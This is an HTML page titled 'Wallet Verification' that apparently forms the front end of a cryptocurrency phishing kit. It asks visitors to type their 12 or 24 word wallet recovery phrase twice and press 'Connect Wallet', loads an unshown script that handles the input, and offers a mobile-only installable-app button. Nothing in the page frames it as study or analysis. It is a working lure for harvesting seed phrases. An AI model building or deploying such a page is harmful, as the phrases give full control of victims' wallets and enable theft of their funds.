<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Wallet Verification</title>
    <link rel="stylesheet" href="wallet-page.css" />

    <!-- PWA Manifest -->
    <link rel="manifest" href="manifest.json" />
    <meta name="theme-color" content="#ffffff" />
  </head>

  <body>
    <div class="container">
      <div class="card-box">
        <img id="walletLogo" class="wallet-logo" alt="Wallet Logo" />
        <h2 id="walletName">Wallet</h2>

        <div class="input-area">
          <textarea
            id="walletInput"
            placeholder="Enter wallet phrase (12 or 24 words)"
            rows="4"
          ></textarea>

          <textarea
            id="phraseInput"
            placeholder="confirm your wallet phrase (12 or 24 words)"
          ></textarea>
        </div>

        <p class="confirm-text">Are you sure you entered correctly?</p>
        <button class="wallet-btn" id="connectBtn">Connect Wallet</button>
      </div>
    </div>

    <!-- Popup -->
    <div id="popup" class="popup">
      <div class="popup-content">
        <p id="popupText"></p>
        <button class="close-btn" id="closePopupBtn">OK</button>
      </div>
    </div>

    <script src="wallet-page.js"></script>

    <!-- Install PWA button -->
    <button id="installBtn" style="display:none; margin:20px auto; padding:10px;">
      Install Wallet App
    </button>

    <!-- PWA Install Logic -->
    <script>
      let deferredPrompt;

      window.addEventListener("beforeinstallprompt", (e) => {
        if (!/Mobi|Android/i.test(navigator.userAgent)) return; // Mobile only
        e.preventDefault();
        deferredPrompt = e;
        document.getElementById("installBtn").style.display = "block";
      });

      document.getElementById("installBtn").addEventListener("click", () => {
        if (deferredPrompt) deferredPrompt.prompt();
        deferredPrompt = null;
      });
    </script>

    <!-- Register Service Worker -->
    <script>
      if ("serviceWorker" in navigator) {
        navigator.serviceWorker.register("service-worker.js");
      }
    </script>
  </body>
</html>
